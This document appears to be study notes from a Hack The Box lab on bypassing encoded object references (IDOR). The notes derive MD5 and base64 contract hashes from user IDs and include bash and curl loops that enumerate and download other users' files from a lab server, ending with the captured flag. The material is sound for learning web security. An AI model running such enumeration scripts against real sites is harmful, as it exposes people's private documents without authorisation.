# 07 idor bypassing encoded references

* Burp Suite
* Intercept GET/POST requests
* Parameter : contract=cdd96d3cc73d1dbdaffa03cc6cd7339b --> appears to be hashing it in an md5 format
* Attempt to hash various values, like uid, username, filename : echo -n 1 | md5sum c4ca4238a0b923820dcc509a6f75849b -
* Burp Comparer and fuzz various values and then compare each to our hash to see if we find any matches

## Function Disclosure

Most modern web applications are developed using JavaScript frameworks, like Angular, React, or Vue.js

\--> Web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers

function downloadContract(uid) { $.redirect("/download.php", { contract: CryptoJS.MD5(btoa(uid)).toString(), }, "POST", "\_self"); }

* Analyze the code : btoa(uid) : base64 encoded string of the uid variable

echo -n 1 | base64 -w 0 | md5sum cdd96d3cc73d1dbdaffa03cc6cd7339b -

* Write a script to enumerate all contracts :

for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b 0b7e7dee87b1c3b98e72131173dfbbbf 0b24df25fe628797b3a50ae0724d2730 f7947d50da7a043693a592b4db43b0a1 8b9af1f7f76daf0f02bd9c48c4a2e3d0 006d1236aee3f92b8322299796ba1989 b523ff8d1ced96cef9c86492e790c2fb d477819d240e7d3dd9499ed8d23e7158 3e57e65a34ffcb2e93cb545d024f5bde 5d4aace023dc088767b4e08c79415dcd

OR

* Use Burp Intruder
* Make a POST request

\#!/bin/bash

for i in {1..10}; do for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do curl -sOJ -X POST -d "contract=$hash" http://SERVER\_IP:PORT/download.php done done

bash ./exploit.sh

## LAB

\
&#x20;   function downloadContract(uid) {\
&#x20;     window.location = \`/download.php?contract=${encodeURIComponent(btoa(uid))}\`;\
&#x20;   }\
&#x20;&#x20;

```
  <ul class="pure-tree">
    <li class="pure-tree_link"><a href="javascript:downloadContract('1')" target="_self">Employment_contract.pdf</a></li>
  </ul>
```

GET /download.php?contract=MQ%3D%3D

echo -n 1 | base64 -w 0 | md5sum | tr -d ' -' cdd96d3cc73d1dbdaffa03cc6cd7339b

echo -n '1' | base64 MQ==

curl http://94.237.55.163:30646//download.php?contract=MQ%3D%3D --output cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf

curl --get --data-urlencode "contract=MQ==" http://94.237.55.163:30646/download.php --output test.pdf

\#!/bin/bash

for i in {1..20}; do for hash in $(echo -n $i | base64); do curl --get --data-urlencode "contract=$hash" http://94.237.55.163:30646/download.php --output test$i.pdf done done

cat test20.pdf HTB{h45h1n6\_1d5\_w0n7\_570p\_m3}
